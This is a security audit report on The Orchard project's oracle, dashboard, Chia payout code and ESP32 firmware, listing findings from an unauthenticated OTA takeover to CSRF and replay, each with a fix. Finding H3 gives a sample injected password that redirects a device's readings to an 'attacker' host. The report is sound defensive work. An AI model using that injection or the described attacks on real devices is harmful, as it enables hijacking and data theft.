# The Orchard — Security Hardening Audit (2026-06-09)

> Full-repo review across the oracle (FastAPI), dashboard (Flask), Chia
> integration (`orchard_chia/`), and ESP32 firmware (`firmware/`, `panel/`).
> Findings below were produced by five domain auditors and the most serious
> were **verified by direct code reading** (marked ✅). Severity reflects the
> *operator's actual deployment* (oracle bound to `0.0.0.0`, Trees on home WiFi).

## Executive summary

| Severity | Count | Headline |
|---|---|---|
| 🔴 Critical | 1 | Unauthenticated, unsigned firmware OTA → remote LAN device takeover |
| 🟠 High | 6 | Unauth attestation writes, reading replay, serial-injection + no-CSRF, weak first-boot keys, plaintext key export |
| 🟡 Medium | 7 | IDOR/GPS leak, no rate-limit, non-atomic payout, symmetric-key blast radius, cleartext HTTP, NFT gate, serial console |
| ⚪ Low | 7 | Headers/CSP, info-leak messages, public-mode leaks, validation gaps |

**What's already solid** (don't let the list above obscure it): secret hygiene
is excellent (nothing sensitive committed), JWT algorithm is pinned, the BLS
wallet-binding and single-use nonce are correct, reading HMAC uses the raw body
with constant-time compare, there's no SQL injection, no Flask debug mode, and
the dashboard's XSS escaping and public-mode scrubbing are thorough.

## Remediation status (2026-06-09)

**Fixed + tested this pass (209 tests pass; firmware compiles):**

| Finding | Fix |
|---|---|
| C1 OTA | `/ota` upload rejected unless armed via the local `OTA_ARM` serial command (firmware builds) |
| H1 `/attestations` | `require_writer` dep — writer token, else loopback-only |
| H2 reading replay | exact-replay dedup on `(node_id, sig)`; no uptime double-count |
| H3 serial injection | control chars rejected in SSID/password/URL; URL scheme allowlisted |
| H4 dashboard CSRF | Origin/Referer guard on state-changing `/api` routes |
| H5 firmware entropy | keys generated under `bootloader_random_enable()` (pre-RF HWRNG) |
| M1 GPS IDOR | precise GPS returned only to the owner session (or unowned nodes) |
| M2 rate limit | per-IP fixed-window limiter on `/auth/*` + `/readings` (loopback exempt) |
| M3 double-pay | provisional watermark *before* broadcast; `set_tx` confirms after |
| M7 NFT gate | indexer collection-id defensive filter; local path documented as self-check |
| L1/L2/L3/L4/L5/L6/L7 | headers, generic auth errors, loopback-gated test-mode, public-mode `store_id`/WC-id scrub, `cat_spend` validation + `verify=False` loopback guard, panel buffer check |
| (bonus) | payout `OracleClient.get_node` — fixed a real correctness bug that made the live payout path dead |

**Deferred — tied to the in-flight ed25519 / transport work, and not flash-verifiable here:**

- **H6 (KEY exports the HMAC secret)** — the `KEY` serial command is still load-bearing for the *current* HMAC provisioning (the dashboard reads it at registration). The real fix is completing the ADR-0003 ed25519 migration so the device keeps its private key and only exports `PUBKEY` (already added); then the HMAC secret + `KEY` can be retired.
- **M5 (cleartext HTTP / replay confidentiality)** — needs the oracle to serve HTTPS + a firmware TLS trust story; pairs with the transport work. The H2 dedup mitigates replay in the meantime.
- **M4 full (asymmetric attestation key / OS keystore)** — the ed25519 Season-signature migration; a key-length guard was added now.
- **M6 broader serial sealing** — `OTA_ARM` gates OTA now; a "sealed after provisioning" flag for `ORACLE_SET`/`WIFI_CLEAR` is a future enhancement (physical-access threat).
- **L1 strict `script-src` CSP** — needs browser verification of the WalletConnect/esm.sh origins (clickjacking `frame-ancestors` shipped now).

## The two root causes (fix these and most findings collapse)

1. **"Localhost-trust" assumptions on a *necessarily* LAN-exposed service.** The
   oracle **must** bind the LAN (`0.0.0.0`) because Trees POST readings to it
   over WiFi — so it cannot hide behind localhost, yet several endpoints were
   written as if only the operator's machine could reach them. The fix is **auth
   + scoping on every endpoint**, not a localhost bind. The per-node `/readings`
   HMAC is the right model; `/attestations` (write) and the read GETs need the
   same rigor. Likewise each Tree runs an open HTTP/serial control surface on
   home WiFi that must assume hostile peers.
2. **Symmetric secrets that can be exfiltrated = permanent forgery.** The device
   HMAC key (exportable over serial) and the oracle attestation HMAC key both
   allow anyone who reads them to forge signed data/attestations forever.
   **Completing the ADR-0003 ed25519 migration** (device + Season signatures →
   asymmetric, private key never leaves its host) is the strategic fix and
   directly retires several findings.

---

## 🔴 Critical

### C1 — Firmware OTA endpoint accepts unauthenticated, unsigned firmware ✅ verified
- **Where:** `firmware/src/net/ota.cpp:33-73` (`/ota` POST → `Update.begin(UPDATE_SIZE_UNKNOWN)` → `Update.write`), server started by `ota_loop()` on WiFi connect.
- **Issue:** No authentication, no source check, no image signature or MD5. Any host on the LAN can POST a firmware image and the device flashes + boots it.
- **Impact:** Remote (no physical access) **full device takeover** of any reachable Tree, including exfiltration of the NVS HMAC secret + ed25519 seed → forge that Tree's signed readings forever. `GET /health` also discloses `node_id`/fw for fleet enumeration.
- **Fix:** (1) Require auth before `Update.begin()` — e.g. an HMAC of a server-issued nonce using the device secret. (2) Verify the image: ship signed firmware and call `Update.installSignature()` (or at minimum require + check `Update.setMD5`). (3) Arm OTA only during an explicit window rather than always-on. Don't rely on "don't expose port 80 to the internet" — the LAN is the threat surface.

---

## 🟠 High

### H1 — `/attestations` POST is unauthenticated; records can be forged or overwritten ✅ verified
- **Where:** `oracle/app/routes/attestations.py:75-141` — only dependency is `get_db`; docstring assumes localhost but the deployment binds `0.0.0.0`.
- **Impact:** Any LAN host can inject or **overwrite** "on-chain" attestation rows for any registered `node_id` (tx id, hours-online, data hash). The dashboard renders these as chain-verified in the "On chain" card. Undermines the integrity claim the project is built on.
- **Fix:** Require a writer token (`ORCHARD_ORACLE_WRITER_TOKEN`, compared with `hmac.compare_digest`) on the POST, and/or bind the oracle to `127.0.0.1`. Reject overwrites that change a record bound to an already-confirmed tx.

### H2 — Reading ingestion has no anti-replay ✅ verified (design)
- **Where:** `oracle/app/routes/readings.py` (`post_reading`) + `oracle/app/auth.py:47-53`.
- **Issue:** A valid `(body, X-Orchard-Sig)` has no nonce/timestamp-freshness/counter check; `tree_ts_ms` is stored but never validated. Transport is plaintext HTTP on the LAN, so capture is realistic.
- **Impact:** Replay a single intercepted reading to inflate a Tree's Season uptime — the basis for $JUICE rewards.
- **Fix:** Put a server nonce or wall-clock-bound timestamp **inside the signed message**; reject stale/duplicate `(node_id, ts)`; add a `UniqueConstraint(node_id, tree_ts_ms)`. Move non-localhost ingest behind TLS.

### H3 — Serial command injection via WiFi password / oracle URL ✅ verified
- **Where:** `dashboard/app/tree_serial.py:183-205` — `set_wifi` only blocks spaces in the SSID; **password and `url` are written raw** as `cmd + "\n"` (sink at line 97). Firmware dispatches one command per newline (`serial_console.cpp`).
- **Impact:** A password like `pw\nORACLE_SET http://attacker/readings` (or any `url` value) injects extra firmware commands — redirect the Tree's signed stream to a hostile oracle, `WIFI_CLEAR`, `REBOOT`.
- **Fix:** Reject/strip control chars (`\r\n`, ideally all `\x00-\x1f`) in `ssid`, `password`, `url` before building the command; validate `url` against an `http(s)://` allowlist.

### H4 — Dashboard control routes have no auth and no CSRF ✅ verified
- **Where:** `dashboard/app/routes/api.py` — `/api/serial/*` and `/api/oracle/register`; the `_private` decorator checks **public-mode only**, not identity. No `SECRET_KEY`, no CSRF token, no Origin/Referer check.
- **Impact:** Any web page the operator visits while the dashboard runs can drive device provisioning via `fetch()` (partially blunted by the JSON content-type preflight, but defeated by DNS-rebinding / localhost pages). Chains with H3 for no-interaction Tree reconfiguration.
- **Fix:** Verify `Origin`/`Referer` against the dashboard host and/or require a custom header the browser only sends same-origin; add a CSRF token to the wizard.

### H5 — Long-lived device keys generated before the RNG is hardware-backed ✅ verified
- **Where:** `firmware/src/identity.cpp:34-43` (`random_bytes` = `esp_random() ^ micros()`), called from `begin()` which runs as **step 1** in `main.cpp` — before `wifi_begin()` (step 5) enables RF. Same in `panel/src/treenode.cpp`.
- **Issue:** `esp_random()` is only a true HRNG once WiFi/BT is active; before that it's a deterministic PRNG. node_id, the HMAC secret, and the **ed25519 provenance seed** are all generated pre-RF.
- **Impact:** If first-boot entropy is low/predictable, an attacker can enumerate likely keys for a freshly provisioned Tree and forge its signed readings without ever touching it — permanently undermining the provenance model.
- **Fix:** Generate persisted keys only **after** RF is enabled, or seed from `bootloader_random_enable()` (valid pre-RF). Add a self-test rejecting degenerate keys.

### H6 — `KEY` serial command exports the HMAC secret in plaintext ✅ verified
- **Where:** `firmware/src/net/serial_console.cpp:125-129` (and `panel/src/treenode.cpp:127-128`); consumed by `dashboard/app/tree_serial.py:130-134`. No gating.
- **Impact:** Any host driving the serial port during normal USB provisioning (incl. host-side malware) reads the secret → permanent ability to forge that Tree's readings. The key never rotates.
- **Fix:** Remove `KEY` from production builds (gate behind `-DORCHARD_DEBUG`), or never export the raw secret — migrate provenance fully to the on-device-only ed25519 key and retire the shared HMAC secret. If a debug read is kept, require boot-button physical presence.

---

## 🟡 Medium

### M1 — Reading/uptime/attestation GETs are unscoped → IDOR + GPS de-anonymization ✅ verified (design)
- **Where:** `oracle/app/routes/readings.py` (`list_readings`), `uptime.py` (`uptime_for_season`), `attestations.py:144-192` — none take a session; only `/nodes` + `/nodes/{id}` are correctly owner-scoped.
- **Impact:** Anyone with a `node_id` (enumerable via the unauthenticated `GET /nodes`) pulls that Tree's raw readings including **GPS lat/lon**, locating the operator — exactly what public-mode was built to prevent.
- **Fix:** Add `maybe_session` and 404 on `wallet_address != session.address` (mirror `get_node`), or strip `gps_lat/lon` for unauthenticated callers.

### M2 — No rate limiting on auth/readings → brute-force + nonce-dict DoS
- **Where:** app-wide (no limiter middleware in `oracle/`). `/auth/challenge` grows an in-memory nonce dict unboundedly.
- **Fix:** Add `slowapi` per-IP limits on `/auth/*` and `/readings`; cap the nonce store.

### M3 — Payout `cat_spend` is not atomic with the watermark write → crash = double-pay
- **Where:** `orchard_chia/payout/main.py:293-323` — broadcasts the spend, then records the watermark in a later loop; the watermark is the only idempotency mechanism.
- **Impact:** A crash between broadcast and record re-pays that `(node, season)` on the next run (real $JUICE).
- **Fix:** Insert a `(node, season)` watermark row (PK-guarded) **before** broadcasting, update with tx_id after; reconcile interrupted runs against wallet history.

### M4 — Attestation signing key: symmetric HMAC, weak at-rest on Windows ✅ verified (design)
- **Where:** `orchard_chia/datalayer/config.py:107-155`; verify at `attest.py:86-97`; paid on at `payout/main.py:86`.
- **Impact:** One key both signs and verifies; anyone who reads `orchard_chia/data/oracle_signing_key.hex` forges attestations the payout pays out on — and `os.chmod(0600)` is a no-op on the operator's Windows host (relies on directory ACL).
- **Fix:** **ADR-0003's ed25519 migration is the real fix** (verifier holds only a public key). Interim: move the key out of the repo tree to an OS credential store; verify the parent-dir ACL on load and refuse to run if group/other-readable.

### M5 — Readings + HMAC sent over cleartext HTTP ✅ verified
- **Where:** `firmware/src/net/oracle.cpp:66-76` (plain `http://`); same in panel.
- **Impact:** LAN eavesdrop of all sensor/location data; enables the H2 replay.
- **Fix:** `WiFiClientSecure` + pinned oracle cert (`https://`); pin an anti-replay field in the signed canonical message.

### M6 — Unauthenticated serial console state changes ✅ verified
- **Where:** `serial_console.cpp` — `ORACLE_SET` (persists an attacker URL to NVS), `WIFI_CLEAR`, `REBOOT`, all unauthenticated.
- **Impact:** USB/host-malware access can persistently redirect a Tree's data or knock it offline. (Physical/local access → Medium.)
- **Fix:** Seal state-changing commands behind a provisioning-mode flag once provisioned; allowlist the `ORACLE_SET` scheme/host.

### M7 — NFT Pass gate matches a metadata collection-id string, not the creator DID
- **Where:** `orchard_chia/nft/verify.py:68-116` (`_matches_genesis`).
- **Impact:** A self-minted NFT declaring `collection.id = <genesis uuid>` passes the local `wallet_holds_pass` gate (used for registration/reward gating). The production path uses the MintGarden indexer (harder to spoof) but trusts the indexer.
- **Fix:** Verify provenance against `ORCHARD_GENESIS_CREATOR_DID` on-chain; treat metadata `collection.id` as a hint only.

---

## ⚪ Low

- **L1 — No security headers / CSP; unpinned `esm.sh` CDN** (`dashboard/app/main.py`): add CSP, `X-Frame-Options: DENY`, `nosniff`; a compromised CDN bundle could read the wallet session in `localStorage` — self-host with SRI. ✅ verified
- **L2 — Verbose `/auth/verify` failure reasons** (`oracle/app/routes/auth.py:135-139`): return a generic message, log the detail. ✅ verified
- **L3 — `auth_test_mode` skips BLS verification if the env var is set** (`oracle/app/wallet_auth.py:344-345`): one-typo-from-critical on a `0.0.0.0` service — refuse it unless host is loopback; loud startup warning. ✅ verified
- **L4 — Public mode leaks DataLayer `store_id` + node `label`** on the tree HTML page (`dashboard/app/routes/tree.py`): gate behind `public_mode`.
- **L5 — WalletConnect project id served in public mode** (`api.py` `/api/auth/config`): use a separate id for public instances.
- **L6 — Payout `cat_spend` doesn't re-validate the recipient at the spend boundary; `verify=False` without loopback enforcement** (`orchard_chia/wallet/rpc.py`): re-assert `xch1…` before broadcast; require a CA when host isn't loopback.
- **L7 — Panel `body[256]` `snprintf` length used unchecked for HMAC/POST** (`panel/src/treenode.cpp:55-64`): check the return; latent OOB-read if the schema grows.

---

## Already solid (verified — keep it this way)

- **Secrets:** `.gitignore` covers every secret path the code touches; no private keys, mnemonics, real fingerprints, or session secrets are committed; all `*.example.*` files are placeholders only.
- **Oracle auth crypto:** JWT decode pins `algorithms=["HS256"]` (rejects `alg=none`/confusion), `exp` enforced; the wallet challenge binds pubkey→puzzle-hash→bech32m address; the nonce is single-use under a lock; reading HMAC is over the raw body with `hmac.compare_digest`; no SQL injection (parametrized ORM); no CORS misconfig.
- **Dashboard:** no `debug=True`; Jinja autoescape on; all dynamic JS goes through `esc()`/`textContent`; public-mode API scrubs wallet address + coarsens GPS.
- **Payout:** dry-run is the genuine default; signature verification is mandatory and fail-closed before any spend; integer mojo math is range-checked; recipient is session-bound + Pass-gated.

## Recommended remediation order

1. **Auth `/attestations` (writer token) + scope the read GETs + reading anti-replay + rate-limit.** The oracle is LAN-exposed by necessity (Trees ingest over WiFi), so endpoint auth — not a localhost bind — is the fix. Retires H1, H2, M1, M2 together.
2. **Sanitize serial inputs** (H3) + **Origin/CSRF check** on dashboard routes (H4) — cheap, high value, chains broken.
3. **Authenticate + verify the OTA image** (C1) — the only remote-takeover path.
4. **Finish the ed25519 migration** (ADR-0003) and **fix first-boot key entropy** (H5) + **gate/remove `KEY`** (H6) — retires the symmetric-key forgery class.
5. **Security headers/CSP** (L1) and the **Low** cluster.
6. **Run a git-history secret scan** (`gitleaks detect --log-opts="--all"` / `trufflehog`) — this audit covered the working tree + HEAD only; `docs/LOG.md` notes a private docx was once dropped in the tree, so confirm nothing was committed in an earlier revision.

---

*Audit scope: working tree at branch `datalayer-verifiable-dataset`. No files were
modified. Git history was not scanned (see step 6).*
